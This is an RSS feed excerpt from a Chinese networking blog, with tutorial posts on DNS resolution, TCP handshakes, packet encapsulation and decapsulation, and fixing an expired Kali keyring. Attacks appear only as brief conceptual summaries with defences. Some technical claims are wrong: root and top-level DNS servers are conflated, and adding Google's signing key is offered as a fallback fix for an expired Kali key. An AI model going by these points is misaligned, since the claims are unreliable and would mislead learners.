你听到主持人的话后，回应说：&amp;ldquo;好的，我接受这个座位。&amp;quot;（发送 &lt;strong>DHCP Request 数据包&lt;/strong>）。&lt;/li>
&lt;li>&lt;strong>确认阶段（Acknowledge）&lt;/strong>
主持人确认你接受了座位后，正式对你说：&amp;ldquo;欢迎你坐下，这个座位是你的了。&amp;quot;（发送 &lt;strong>DHCP Ack 数据包&lt;/strong>）。&lt;/li>
&lt;/ol>
&lt;p>通过这个过程，你成功找到了自己的座位。DHCP协议的工作原理也是如此，帮助设备在复杂的网络环境中自动找到属于自己的IP地址。&lt;/p></description></item><item><title>DNS协议与域名解析</title><link>https://souljian.cn/p/745333135/</link><pubDate>Tue, 22 Apr 2025 22:45:35 +0800</pubDate><guid>https://souljian.cn/p/745333135/</guid><description>&lt;h1 id="">
&lt;/h1>&lt;h2 id="一dns协议简介">一、DNS协议简介
&lt;/h2>&lt;p>DNS（Domain Name System）即域名系统，是互联网中用于将域名转换为IP地址的协议。它解决了用户记忆IP地址的困难，使得用户可以通过易于记忆的域名来访问网络资源。&lt;/p>
&lt;h2 id="二域名解析过程">二、域名解析过程
&lt;/h2>&lt;h3 id="1-本地缓存查询">1. 本地缓存查询
&lt;/h3>&lt;p>当用户输入一个域名时，计算机首先会在本地缓存中查找是否有该域名对应的IP地址。如果找到，直接返回IP地址，无需进一步查询。&lt;/p>
&lt;h3 id="2-本地dns服务器查询">2. 本地DNS服务器查询
&lt;/h3>&lt;p>如果本地缓存中没有找到，计算机将向本地DNS服务器（通常是ISP（互联网服务提供商）提供的DNS服务器）发送查询请求。本地DNS服务器会检查自己的缓存，如果找到对应的IP地址，返回给用户；如果没有，进入下一步。&lt;/p>
&lt;h3 id="3-递归查询与迭代查询">3. 递归查询与迭代查询
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>递归查询&lt;/strong>：本地DNS服务器向其他DNS服务器查询，直到找到目标IP地址并返回给用户。用户只需等待最终结果，无需关心查询过程。&lt;/li>
&lt;li>&lt;strong>迭代查询&lt;/strong>：本地DNS服务器向其他DNS服务器发送查询请求后，返回一个指向其他DNS服务器的地址，由用户自己继续查询，直到找到目标IP地址。&lt;/li>
&lt;/ul>
&lt;h3 id="4-根域名服务器查询">4. 根域名服务器查询
&lt;/h3>&lt;p>如果本地DNS服务器无法找到目标IP地址，会向根域名服务器（如&lt;code>.com&lt;/code>、&lt;code>.org&lt;/code>等顶级域名服务器）查询。根域名服务器会返回一个指向权威DNS服务器的地址。&lt;/p>
&lt;h3 id="5-权威dns服务器查询">5. 权威DNS服务器查询
&lt;/h3>&lt;p>最终，查询请求会到达权威DNS服务器，它会返回域名对应的IP地址。&lt;/p>
&lt;h3 id="6-缓存更新">6. 缓存更新
&lt;/h3>&lt;p>查询结果会被本地DNS服务器和用户的计算机缓存起来，以便下次快速查询。&lt;/p>
&lt;h2 id="三dns协议的重要性">三、DNS协议的重要性
&lt;/h2>&lt;ul>
&lt;li>&lt;strong>方便用户访问&lt;/strong>：用户无需记忆复杂的IP地址，只需输入域名即可访问网站。&lt;/li>
&lt;li>&lt;strong>负载均衡&lt;/strong>：通过DNS可以将流量分配到多个服务器，提高网站的可用性和性能。&lt;/li>
&lt;li>&lt;strong>故障转移&lt;/strong>：当某个服务器出现故障时，DNS可以将流量重定向到备用服务器，确保服务的连续性。&lt;/li>
&lt;/ul>
&lt;h2 id="四dns攻击">四、DNS攻击
&lt;/h2>&lt;ul>
&lt;li>&lt;strong>DNS劫持&lt;/strong>：攻击者篡改DNS解析结果，将用户引导到恶意网站。&lt;/li>
&lt;li>&lt;strong>DNS缓存污染&lt;/strong>：攻击者向DNS缓存中注入错误的IP地址，导致用户访问错误的网站。&lt;/li>
&lt;li>&lt;strong>DDoS攻击&lt;/strong>：攻击者通过大量虚假DNS查询请求，使DNS服务器瘫痪。&lt;/li>
&lt;/ul>
&lt;h2 id="五dns解析的生动例子">五、DNS解析的生动例子
&lt;/h2>&lt;p>假设你正在寻找一家名为&amp;quot;快乐汉堡&amp;quot;的餐厅。你只知道餐厅的名字，但不知道它的具体地址。于是你开始了一段寻找之旅：&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>本地缓存查询&lt;/strong>
你先问自己的朋友（&lt;strong>本地缓存&lt;/strong>）：&amp;ldquo;你知道快乐汉堡在哪里吗？&amp;ldquo;如果朋友知道，直接告诉你地址，你就直接去了。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>本地DNS服务器查询&lt;/strong>
如果朋友不知道，你会去问本地的导航站（&lt;strong>本地DNS服务器&lt;/strong>）：&amp;ldquo;你知道快乐汉堡在哪里吗？&amp;ldquo;导航站会查自己的地图（缓存），如果找到了，告诉你地址；如果没有，进入下一步。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>递归查询与迭代查询&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>递归查询&lt;/strong>：导航站会帮你去问其他导航站，直到找到地址，然后告诉你。&lt;/li>
&lt;li>&lt;strong>迭代查询&lt;/strong>：导航站会告诉你去下一个导航站，你自己继续问，直到找到地址。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>根域名服务器查询&lt;/strong>
如果本地导航站也不知道，它会带你去城市的中心导航站（&lt;strong>根域名服务器&lt;/strong>），那里会告诉你去哪个区域的导航站（&lt;strong>权威DNS服务器&lt;/strong>）。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>权威DNS服务器查询&lt;/strong>
最后，你到了区域导航站（&lt;strong>权威DNS服务器&lt;/strong>），它会告诉你&amp;quot;快乐汉堡&amp;quot;的具体地址。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>缓存更新&lt;/strong>
导航站会把&amp;quot;快乐汉堡&amp;quot;的地址记录下来，下次别人问的时候，可以直接告诉他们。&lt;/p>
&lt;/li>
&lt;/ol></description></item><item><title>Kali 密钥环过期解决方案</title><link>https://souljian.cn/p/745300848/</link><pubDate>Tue, 22 Apr 2025 13:47:28 +0800</pubDate><guid>https://souljian.cn/p/745300848/</guid><description>&lt;h1 id="kali-密钥环过期解决方案">kali 密钥环过期解决方案
&lt;/h1>&lt;p>出现以下告警：校验数字签名时出错&lt;/p>
&lt;p>&lt;img src="https://souljian.cn/p/745300848/img/2025-04-22-14-02-58.png"
width="889"
height="472"
srcset="https://souljian.cn/p/745300848/img/2025-04-22-14-02-58_hu_d827f4d55da93f47.png 480w, https://souljian.cn/p/745300848/img/2025-04-22-14-02-58_hu_8c94583d982fab81.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="188"
data-flex-basis="452px"
>&lt;/p>
&lt;p>可以尝试以下解决方法： 这些公钥通常用于验证从 APT 软件仓库下载的软件包的签名，以确保它们的完整性和来源的可信度。 当你运行 apt -key list 命令时，它会显示一个或多个公钥的列表，每个公钥都包含以下信息：&lt;/p>
&lt;p>公钥 ID ：一个唯一的标识符，用于区分不同的公钥。&lt;/p>
&lt;p>创建日期 ：公钥生成的日期。&lt;/p>
&lt;p>过期日期 ：公钥不再被信任的日期（如果适用）。&lt;/p>
&lt;p>用户 ID (UID) ：与公钥相关联的用户或实体的标识信息，通常包括名称和电子邮件地址。&lt;/p>
&lt;p>指纹 ：公钥的完整哈希值，用于唯一标识公钥并验证其真实性。 发现 /etc/apt/trusted.gpg.d/kali -archive -keyring.gpg 密钥环过期
&lt;img src="https://souljian.cn/p/745300848/img/2025-04-22-13-53-25.png"
width="891"
height="667"
srcset="https://souljian.cn/p/745300848/img/2025-04-22-13-53-25_hu_844c324a6ec7e4c0.png 480w, https://souljian.cn/p/745300848/img/2025-04-22-13-53-25_hu_2c870001ac5d4cd6.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="133"
data-flex-basis="320px"
>&lt;/p>
&lt;p>apt-key list ======= 列出系统中所有已信任的 GPG 公钥 备份原密钥环
&lt;img src="https://souljian.cn/p/745300848/img/2025-04-22-13-53-53.png"
width="892"
height="667"
srcset="https://souljian.cn/p/745300848/img/2025-04-22-13-53-53_hu_e74f9e94cf3cd761.png 480w, https://souljian.cn/p/745300848/img/2025-04-22-13-53-53_hu_5d1785b39e9e9b4d.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="133"
data-flex-basis="320px"
>&lt;/p>
&lt;p>执行以下命令重新导入秘钥环 有效期更新
&lt;img src="https://souljian.cn/p/745300848/img/2025-04-22-13-54-41.png"
width="886"
height="664"
srcset="https://souljian.cn/p/745300848/img/2025-04-22-13-54-41_hu_1b9ca56bedfb26c9.png 480w, https://souljian.cn/p/745300848/img/2025-04-22-13-54-41_hu_cd80306348b47c17.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="133"
data-flex-basis="320px"
>&lt;/p>
&lt;p>wget -O - &lt;a class="link" href="https://archive.kali.org/archive-key.asc" target="_blank" rel="noopener"
>https://archive.kali.org/archive-key.asc&lt;/a> |apt-key add&lt;/p>
&lt;p>如果在执行以上指令时出现错误提示，则可以更换成以下指令重新执行&lt;/p>
&lt;p>wget -O - &lt;a class="link" href="https://dl.google.com/linux/linux_signing_key.pub" target="_blank" rel="noopener"
>https://dl.google.com/linux/linux_signing_key.pub&lt;/a> | apt-key add -
&lt;img src="https://souljian.cn/p/745300848/img/2025-04-22-13-54-11.png"
width="885"
height="667"
srcset="https://souljian.cn/p/745300848/img/2025-04-22-13-54-11_hu_72a75cc769b815c8.png 480w, https://souljian.cn/p/745300848/img/2025-04-22-13-54-11_hu_a9f7fc2257fd3b8f.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="132"
data-flex-basis="318px"
>&lt;/p>
&lt;p>reboot apt-key list apt update ：更新本地软件包索引的命令&lt;/p>
&lt;p>apt upgrade ：更新已安装软件包的命令&lt;/p>
&lt;p>sudo apt update &amp;amp;&amp;amp; sudo apt upgrade ======= 更新安装软件包&lt;/p></description></item><item><title>TCP三次握手和四次挥手</title><link>https://souljian.cn/p/745243663/</link><pubDate>Mon, 21 Apr 2025 21:54:23 +0800</pubDate><guid>https://souljian.cn/p/745243663/</guid><description>&lt;h2 id="目录">目录
&lt;/h2>&lt;ol>
&lt;li>&lt;a class="link" href="#tcp%e5%8d%8f%e8%ae%ae%e7%ae%80%e4%bb%8b" >TCP协议简介&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="#%e4%b8%89%e6%ac%a1%e6%8f%a1%e6%89%8b%e8%bf%87%e7%a8%8b" >三次握手过程&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="#%e5%9b%9b%e6%ac%a1%e6%8c%a5%e6%89%8b%e8%bf%87%e7%a8%8b" >四次挥手过程&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="#%e6%8a%80%e6%9c%af%e7%bb%86%e8%8a%82%e8%a7%a3%e6%9e%90" >技术细节解析&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="#%e5%ae%9e%e9%99%85%e5%ba%94%e7%94%a8%e5%9c%ba%e6%99%af" >实际应用场景&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="#%e5%ae%89%e5%85%a8%e6%80%a7%e8%80%83%e8%99%91" >安全性考虑&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="tcp协议简介">TCP协议简介
&lt;/h2>&lt;p>TCP（传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议。它具有以下特点：&lt;/p>
&lt;p>• &lt;strong>面向连接&lt;/strong>：通信前需要建立连接（三次握手），通信结束后需要断开连接（四次挥手）
• &lt;strong>可靠传输&lt;/strong>：使用确认机制和重传机制确保数据不丢失
• &lt;strong>流量控制&lt;/strong>：通过滑动窗口机制控制发送速率
• &lt;strong>拥塞控制&lt;/strong>：避免网络拥塞，动态调整传输速率&lt;/p>
&lt;hr>
&lt;h3 id="-三次握手过程例子快递员确认收货地址">📦 &lt;strong>三次握手过程——例子：快递员确认收货地址&lt;/strong>
&lt;/h3>&lt;p>假设你的浏览器（Chrome）是寄件人，服务器（Apache）是收件人，TCP协议（运输层）是快递公司，三次握手就像快递员上门确认地址的过程：&lt;/p>
&lt;h4 id="1-第一次握手浏览器服务器">&lt;strong>1. 第一次握手（浏览器→服务器）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
• 浏览器发送一个&lt;code>SYN=1&lt;/code>的包裹（SYN是同步序列号请求），并生成随机序号&lt;code>seq=1000&lt;/code>
• 快递员（TCP）说：&amp;ldquo;您好，我是快递员，Chrome想给Apache寄包裹，您能收吗？&amp;rdquo;
• &lt;strong>状态变化&lt;/strong>：
• 客户端状态：CLOSED → SYN_SENT
• 服务端状态：LISTEN&lt;/p>
&lt;h4 id="2-第二次握手服务器浏览器">&lt;strong>2. 第二次握手（服务器→浏览器）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
• 服务器收到&lt;code>SYN&lt;/code>后，回复&lt;code>SYN=1 + ACK=1&lt;/code>，序号&lt;code>seq=2000&lt;/code>，确认号&lt;code>ack=1001&lt;/code>
• 快递员反馈：&amp;ldquo;Apache确认能收件，请把包裹按编号1001开始发给我！&amp;rdquo;
• &lt;strong>状态变化&lt;/strong>：
• 服务端状态：LISTEN → SYN_RECEIVED
• &lt;strong>技术点&lt;/strong>：
• &lt;code>ACK=1&lt;/code>表示确认收到第一次握手
• &lt;code>ack=1001&lt;/code>表示&amp;quot;我期待收到下一个编号是1001的数据&amp;quot;
• 确认号计算规则：收到的序号+1&lt;/p>
&lt;h4 id="3-第三次握手浏览器服务器">&lt;strong>3. 第三次握手（浏览器→服务器）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
• 浏览器发送&lt;code>ACK=1&lt;/code>，序号&lt;code>seq=1001&lt;/code>，确认号&lt;code>ack=2001&lt;/code>
• 快递员说：&amp;ldquo;好的，我会按您的要求开始寄送！&amp;rdquo;
• &lt;strong>状态变化&lt;/strong>：
• 客户端状态：SYN_SENT → ESTABLISHED
• 服务端状态：SYN_RECEIVED → ESTABLISHED&lt;/p>
&lt;h4 id="-为什么必须三次">💡 &lt;strong>为什么必须三次？&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>防止历史连接干扰&lt;/strong>：如果第一次握手的包裹卡在路由器（N1/N2）后又重复发送，服务器能通过第三次握手判断是否为过期请求
• &lt;strong>确保双方同步&lt;/strong>：通过三次握手，双方都能确认对方的发送和接收能力
• &lt;strong>避免资源浪费&lt;/strong>：防止已失效的连接请求报文突然又传送到服务端，造成错误&lt;/p>
&lt;hr>
&lt;h3 id="-四次挥手过程例子快递员确认包裹已全部送达">✋ &lt;strong>四次挥手过程——例子：快递员确认包裹已全部送达&lt;/strong>
&lt;/h3>&lt;p>当数据传输完毕，TCP需要安全断开连接，就像快递员要确认双方都没有包裹需要寄送了：&lt;/p>
&lt;h4 id="1-第一次挥手浏览器服务器">&lt;strong>1. 第一次挥手（浏览器→服务器）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
• 浏览器发送&lt;code>FIN=1&lt;/code>（FIN是结束标志），序号&lt;code>seq=5000&lt;/code>
• 快递员说：&amp;ldquo;Chrome的包裹都寄完了，准备收工啦！&amp;rdquo;
• &lt;strong>状态变化&lt;/strong>：
• 客户端状态：ESTABLISHED → FIN_WAIT_1&lt;/p>
&lt;h4 id="2-第二次挥手服务器浏览器">&lt;strong>2. 第二次挥手（服务器→浏览器）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
• 服务器回复&lt;code>ACK=1&lt;/code>，确认号&lt;code>ack=5001&lt;/code>
• 快递员反馈：&amp;ldquo;好的，我收到你的收工通知了，但等我确认Apache还有没有包裹要寄给你&amp;rdquo;
• &lt;strong>状态变化&lt;/strong>：
• 服务端状态：ESTABLISHED → CLOSE_WAIT
• 客户端状态：FIN_WAIT_1 → FIN_WAIT_2&lt;/p>
&lt;h4 id="3-第三次挥手服务器浏览器">&lt;strong>3. 第三次挥手（服务器→浏览器）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
• 服务器发送&lt;code>FIN=1&lt;/code>，序号&lt;code>seq=8000&lt;/code>
• 快递员说：&amp;ldquo;Apache这边也没有包裹要寄了，可以收工！&amp;rdquo;
• &lt;strong>状态变化&lt;/strong>：
• 服务端状态：CLOSE_WAIT → LAST_ACK&lt;/p>
&lt;h4 id="4-第四次挥手浏览器服务器">&lt;strong>4. 第四次挥手（浏览器→服务器）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
• 浏览器回复&lt;code>ACK=1&lt;/code>，确认号&lt;code>ack=8001&lt;/code>
• 快递员确认：&amp;ldquo;双方都确认完毕，连接正式关闭！&amp;rdquo;
• &lt;strong>状态变化&lt;/strong>：
• 客户端状态：FIN_WAIT_2 → TIME_WAIT → CLOSED
• 服务端状态：LAST_ACK → CLOSED&lt;/p>
&lt;h4 id="-为什么挥手要四次">💡 &lt;strong>为什么挥手要四次？&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>双向关闭原则&lt;/strong>：TCP是全双工通信，每个方向都需要单独关闭
• 第一次挥手：客户端关闭发送通道
• 第二次挥手：服务端确认客户端的关闭请求
• 第三次挥手：服务端关闭发送通道
• 第四次挥手：客户端确认服务端的关闭请求
• &lt;strong>数据完整性保证&lt;/strong>：确保双方的数据都能完整传输，不会因为一方提前关闭而丢失数据&lt;/p>
&lt;hr>
&lt;h3 id="-技术细节解析">🔧 &lt;strong>技术细节解析&lt;/strong>
&lt;/h3>&lt;h4 id="tcp标志位说明">&lt;strong>TCP标志位说明&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>SYN（同步序列号）&lt;/strong>：用于建立连接时同步序列号
• &lt;strong>ACK（确认标志）&lt;/strong>：表示确认号字段有效
• &lt;strong>FIN（结束标志）&lt;/strong>：用于释放连接
• &lt;strong>RST（重置连接）&lt;/strong>：用于异常终止连接
• &lt;strong>PSH（推送标志）&lt;/strong>：接收方应尽快将这个报文段交给应用层
• &lt;strong>URG（紧急标志）&lt;/strong>：表示紧急指针字段有效&lt;/p>
&lt;h4 id="序列号与确认号">&lt;strong>序列号与确认号&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>序列号（seq）&lt;/strong>：
• 用于标识从TCP源端向目的端发送的字节流
• 初始序列号（ISN）是随机生成的
• &lt;strong>确认号（ack）&lt;/strong>：
• 期望收到对方下一个报文段的第一个数据字节的序号
• 计算方式：收到的序列号 + 1&lt;/p>
&lt;hr>
&lt;h3 id="-实际应用场景">🌐 &lt;strong>实际应用场景&lt;/strong>
&lt;/h3>&lt;h4 id="1-网页浏览">&lt;strong>1. 网页浏览&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>场景描述&lt;/strong>：
• 打开网页时自动完成三次握手
• 数据传输过程中保持连接
• 关闭标签页时触发四次挥手
• &lt;strong>注意事项&lt;/strong>：
• 现代浏览器通常使用HTTP长连接（Keep-Alive）
• 一个TCP连接可以复用于多个HTTP请求&lt;/p>
&lt;h4 id="2-文件下载">&lt;strong>2. 文件下载&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>特点&lt;/strong>：
• 建立连接后持续传输大量数据
• 支持断点续传（基于序列号机制）
• &lt;strong>优化建议&lt;/strong>：
• 适当增大TCP窗口大小
• 启用TCP快速重传机制&lt;/p>
&lt;h4 id="3-实时通信">&lt;strong>3. 实时通信&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>应用场景&lt;/strong>：
• 即时通讯
• 在线游戏
• 视频会议
• &lt;strong>性能考虑&lt;/strong>：
• 需要低延迟
• 可能需要配置TCP_NODELAY选项&lt;/p>
&lt;hr>
&lt;h3 id="-安全性考虑">🛡️ &lt;strong>安全性考虑&lt;/strong>
&lt;/h3>&lt;h4 id="1-syn洪泛攻击">&lt;strong>1. SYN洪泛攻击&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>攻击原理&lt;/strong>：
• 攻击者发送大量SYN请求但不完成三次握手
• 服务器为每个请求分配资源，最终耗尽资源
• &lt;strong>防护措施&lt;/strong>：
• 启用SYN Cookie
• 增大半连接队列
• 设置合理的超时时间&lt;/p>
&lt;h4 id="2-tcp重置攻击">&lt;strong>2. TCP重置攻击&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>攻击原理&lt;/strong>：
• 攻击者伪造RST包中断正常连接
• &lt;strong>防护措施&lt;/strong>：
• 启用TCP MD5认证
• 使用IPSec保护TCP连接&lt;/p>
&lt;h4 id="3-连接耗尽攻击">&lt;strong>3. 连接耗尽攻击&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>攻击原理&lt;/strong>：
• 建立大量TCP连接但不释放
• &lt;strong>防护措施&lt;/strong>：
• 限制单IP的最大连接数
• 启用连接超时机制&lt;/p>
&lt;hr>
&lt;h3 id="-常见问题与解决方案">🔍 &lt;strong>常见问题与解决方案&lt;/strong>
&lt;/h3>&lt;h4 id="1-连接建立失败">&lt;strong>1. 连接建立失败&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>可能原因&lt;/strong>：
• 网络不通
• 服务端端口未开放
• 防火墙拦截
• &lt;strong>解决方案&lt;/strong>：
• 检查网络连通性
• 确认服务状态
• 检查防火墙规则&lt;/p>
&lt;h4 id="2-连接无法释放">&lt;strong>2. 连接无法释放&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>可能原因&lt;/strong>：
• TIME_WAIT状态积累
• 程序未正确关闭连接
• &lt;strong>解决方案&lt;/strong>：
• 调整TCP参数（tcp_tw_reuse）
• 优化程序代码，确保正确关闭连接&lt;/p>
&lt;h4 id="3-性能问题">&lt;strong>3. 性能问题&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>表现&lt;/strong>：
• 连接建立慢
• 数据传输延迟大
• &lt;strong>优化方案&lt;/strong>：
• 使用TCP Fast Open
• 调整TCP缓冲区大小
• 优化网络路由&lt;/p>
&lt;hr>
&lt;h3 id="-延伸阅读">📚 &lt;strong>延伸阅读&lt;/strong>
&lt;/h3>&lt;ol>
&lt;li>&lt;strong>TCP状态转换&lt;/strong>&lt;/li>
&lt;li>&lt;strong>TCP流量控制&lt;/strong>&lt;/li>
&lt;li>&lt;strong>TCP拥塞控制&lt;/strong>&lt;/li>
&lt;li>&lt;strong>TCP keepalive机制&lt;/strong>&lt;/li>
&lt;li>&lt;strong>TCP安全加固最佳实践&lt;/strong>&lt;/li>
&lt;/ol>
&lt;hr></description></item><item><title>数据包解包过程</title><link>https://souljian.cn/p/745243566/</link><pubDate>Mon, 21 Apr 2025 21:52:46 +0800</pubDate><guid>https://souljian.cn/p/745243566/</guid><description>&lt;p>好的！我们结合原图用 &lt;strong>「拆快递」&lt;/strong> 的比喻来解释&lt;strong>解包过程&lt;/strong>，帮你把封包/解包的全流程对应到图中的每一层结构：&lt;/p>
&lt;hr>
&lt;h3 id="-解包过程详解对照原图的五层结构">📦 &lt;strong>解包过程详解（对照原图的五层结构）&lt;/strong>
&lt;/h3>&lt;p>假设服务器收到你从Chrome发来的数据包（封包过程见前文），现在需要&lt;strong>从物理层到应用层逐层解包&lt;/strong>：&lt;/p>
&lt;h4 id="1-物理层--数据链路层撕外层包装">&lt;strong>1. 物理层 → 数据链路层（撕外层包装）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
• 服务器网卡收到光信号/电信号
• 将信号转换为二进制数据流（&lt;code>011010...&lt;/code>）
• &lt;strong>对应&lt;/strong>：
•物理层接收信号，传递给右侧数据链路层&lt;/p>
&lt;h4 id="2-数据链路层拆卡车运输箱">&lt;strong>2. 数据链路层（拆卡车运输箱）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
• 检查数据帧的&lt;strong>MAC地址&lt;/strong>（类似核对卡车车牌号）
• 剥离MAC头部，发现目的地是当前服务器
• 如果MAC地址匹配，把数据包交给 网络层 ；不匹配则丢弃
• &lt;strong>对应&lt;/strong>：
• 据链路层剥离封装 → 网络层 开始工作&lt;/p>
&lt;h4 id="3-网络层拆地址分拣标签">&lt;strong>3. 网络层（拆地址分拣标签）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
• 检查IP头部，确认目的IP是&lt;code>10.20.1.100&lt;/code>（服务器自身IP）
• 剥离IP头部，查看传输层协议类型（如TCP/UDP）
• 如果IP不匹配且服务器是路由器，会重新转发（类似快递中转站）
• &lt;strong>对应&lt;/strong>：
•网络层剥离IP封装 → 运输层处理&lt;/p>
&lt;h4 id="4-运输层拆快递小包裹">&lt;strong>4. 运输层（拆快递小包裹）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
• TCP协议检查&lt;strong>端口号&lt;/strong>（比如目的端口&lt;code>80&lt;/code>对应Apache服务）
• 检查数据包顺序号和校验和，若丢包则要求重发（类似快递员打电话让你补发丢失的箱子）
• 重组被拆分的多个小包裹，恢复完整数据流
• &lt;strong>对应&lt;/strong>：
• 右侧运输层重组数据 → 应用层准备接收&lt;/p>
&lt;h4 id="5-应用层拆最终包裹">&lt;strong>5. 应用层（拆最终包裹）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
• Apache服务器解析HTTP请求内容（比如&amp;quot;请给我首页HTML&amp;quot;）
• 生成响应数据（网页内容），开始反向封包过程（把包裹寄回浏览器）
• &lt;strong>对应图示&lt;/strong>：
• 右侧应用层的Apache进程处理请求，完成解包&lt;/p>
&lt;hr>
&lt;h3 id="-封包-vs-解包关键对比">🔄 &lt;strong>封包 vs 解包关键对比&lt;/strong>
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>&lt;strong>过程&lt;/strong>&lt;/th>
&lt;th>&lt;strong>方向&lt;/strong>&lt;/th>
&lt;th>&lt;strong>典型动作&lt;/strong>&lt;/th>
&lt;th>&lt;strong>图示对应关系&lt;/strong>&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>封包&lt;/td>
&lt;td>从应用层→物理层&lt;/td>
&lt;td>逐层&lt;strong>添加头部&lt;/strong>（如IP头、TCP头）&lt;/td>
&lt;td>左側Chrome各层向下封装&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>解包&lt;/td>
&lt;td>从物理层→应用层&lt;/td>
&lt;td>逐层&lt;strong>剥离头部&lt;/strong>并校验&lt;/td>
&lt;td>右側Apache各层向上解封装&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;h3 id="-解包过程中的核心技术">💡 &lt;strong>解包过程中的核心技术&lt;/strong>
&lt;/h3>&lt;ol>
&lt;li>&lt;strong>MAC地址过滤&lt;/strong>（数据链路层）：
• 类似快递驿站只接收本小区快递，服务器会丢弃MAC地址不匹配的数据包&lt;/li>
&lt;li>&lt;strong>IP地址验证&lt;/strong>（网络层）：
• 服务器确认数据包是&amp;quot;寄给自己&amp;quot;的，否则执行转发或丢弃&lt;/li>
&lt;li>&lt;strong>端口号映射&lt;/strong>（运输层）：
• 通过目的端口&lt;code>80&lt;/code>，将数据交给Apache进程（类似快递员按门牌号送货）&lt;/li>
&lt;li>&lt;strong>数据重组&lt;/strong>（运输层）：
• 如果收到顺序错乱的包裹（如先收到编号3/3，再收到1/3），TCP会重新排序&lt;/li>
&lt;li>&lt;strong>应用协议解析&lt;/strong>（应用层）：
• Apache根据HTTP协议解析请求内容，理解用户想要什么网页&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h3 id="-结合原图的完整流程">🌐 &lt;strong>结合原图的完整流程&lt;/strong>
&lt;/h3>&lt;ol>
&lt;li>&lt;strong>封包（Chrome→N1→N2→Apache）&lt;/strong> ：
• 左側橙色（应用层）→蓝色→绿色→青色→深绿色，经N1/N2路由器传递&lt;/li>
&lt;li>&lt;strong>解包（Apache←N2←N1←Chrome）&lt;/strong> ：
• 右側深绿色（物理层）←青色←绿色←蓝色←橙色，逆向剥离每层封装&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h3 id="-为什么分层解包重要">🛠️ &lt;strong>为什么分层解包重要？&lt;/strong>
&lt;/h3>&lt;p>• &lt;strong>错误隔离&lt;/strong>：如果物理层信号干扰（深绿色层），只需重传这一层数据，不影响上层
• &lt;strong>高效处理&lt;/strong>：网络层（绿色）快速判断IP地址，无需解析全部数据
• &lt;strong>灵活扩展&lt;/strong>：新增加密协议只需修改应用层（橙色），其他层保持不变&lt;/p>
&lt;p>下次看到网络分层图时，可以想象数据包像&lt;strong>俄罗斯套娃&lt;/strong>，每一层都包裹着更核心的数据！ 🪆&lt;/p></description></item><item><title>数据包封装过程</title><link>https://souljian.cn/p/745243535/</link><pubDate>Mon, 21 Apr 2025 21:52:15 +0800</pubDate><guid>https://souljian.cn/p/745243535/</guid><description>&lt;p>我们以 &lt;strong>10网段私有IP地址&lt;/strong> 为例（比如你家/公司内网），重新还原整个过程，重点标注源IP和目的IP：&lt;/p>
&lt;hr>
&lt;h3 id="-快递运输过程10网段ip版">📦 &lt;strong>快递运输过程（10网段IP版）&lt;/strong>
&lt;/h3>&lt;p>假设你的电脑IP是 &lt;code>10.0.0.2&lt;/code>，要访问公司内网的服务器IP &lt;code>10.20.1.100&lt;/code>，流程如下：&lt;/p>
&lt;h4 id="1-应用层对话">&lt;strong>1. 应用层（对话）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>你的浏览器（Chrome）&lt;/strong>
• 源IP：&lt;code>10.0.0.2&lt;/code>（你的电脑）
• 目的IP：&lt;code>10.20.1.100&lt;/code>（公司服务器）
